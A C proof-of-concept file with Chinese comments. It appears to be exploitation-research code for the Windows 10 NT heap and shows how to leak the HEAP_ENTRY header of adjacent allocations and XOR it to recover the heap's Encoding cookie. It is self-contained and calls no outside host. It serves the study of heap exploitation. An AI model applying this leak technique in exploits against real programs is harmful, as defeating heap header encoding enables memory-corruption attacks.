/*
tested on windows 10 x64 19042.630 Release

ntheap frontend leak _heap->Encoding POC 
_heap->Encoding这个值在 _heap + 0x88 的位置

大致原理:
    _heap_entry:
        previous_block_data(8bytes)
        | size(2bytes) | Flag(1byte, 1指inuse, 0指freed)
        | smalltagindex (1byte, 前三个byte的异或)
        | previous_size(2bytes)
        | segment_offset(1byte, 好像一般为0, 所以leak会在这截断,不过cookie也在这截断)
        | unused_byte(1byte, 标识是否是lfh?)
注意:
    调试时, 直接运行程序, 和用windbg调试打开的程序的heap是不一样的.
    正确的调试方法是, 在cmd中运行, 然后attach上去查看
        这样可以清晰看到_heap 中的FrontEndHeap是默认打开的, 也就是会使用LFH
        此时malloc(0x100) -> 实际size为0x110
    假如在调试模式下FrontEndHeap是默认关闭
        并且比如malloc(0x100) -> 实际size为0x130
        而且_heap_entry->flag域也不一样
要求:
    需要能leak出_heap_entry的头部
预期效果:
    获得这个cookie

refer: https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version
       https://github.com/scwuaptx/LazyFragmentationHeap/
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

LPVOID ptr[0x20];

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
LPVOID Alloc(SIZE_T cb) {
    return calloc(1, cb);
}
void Free(void* ptr) {
    return free(ptr);
}
void log() {
    for (int i = 0; i < 0x20; i++) {
        if (ptr[i]) {
            printf("idx: %d --> %p\n", i, ptr[i]);
        }
    }
    putchar('\n');
}
int main()
{
    init();
    //0:004 > !heap -p -a 00000000`00530860 # 解析heap头
    //    address 0000000000530860 found in
    //    _HEAP @ 520000
    //    HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
    //    0000000000530850 0011 0000[00]   0000000000530860    00100 - (busy)

    // padding 
    Alloc(0x228); Alloc(0x228); Alloc(0x228);
    // begin, 让下面的分配连续
    ptr[0] = Alloc(0x228); // real: 0x230
    ptr[1] = Alloc(0x228); // real: 0x230
    ptr[2] = Alloc(0x228); // real: 0x230
    ptr[3] = Alloc(0x228); // real: 0x230

    log();
    //getchar(); //waiting for attach
    SIZE_T leak = *(SIZE_T*)((intptr_t)ptr[1] - 8);
    printf("leak(inused): %p\n", leak);

    SIZE_T cookie = (leak ^ 0x002322010023) & 0xffffffffffff; // 这里注意, 高位直接省略掉了
    // 0x002322010023: 从左往右看
    // 0023, 是前一个chunk的真实大小
    // 2201, 其中01&1 ==1 表示当前正在使用 22h = 01h^00h^23h 
    //          最好cmd运行+调试得到.
    // 0023, 当前chunk的真实大小    
    printf("cookie calc from ptr[1]: %p\n\n", cookie);

    Free(ptr[2]);
    leak = *(SIZE_T*)((intptr_t)ptr[2] - 8);
    printf("leak(freed): %p\n", leak);
    cookie = (leak ^ 0x002323000023) & 0xffffffffffff; // 这里注意, 高位直接省略掉了
    printf("cookie calc from ptr[2]: %p\n\n", cookie);
    ptr[2] = 0;

    return 0;
}
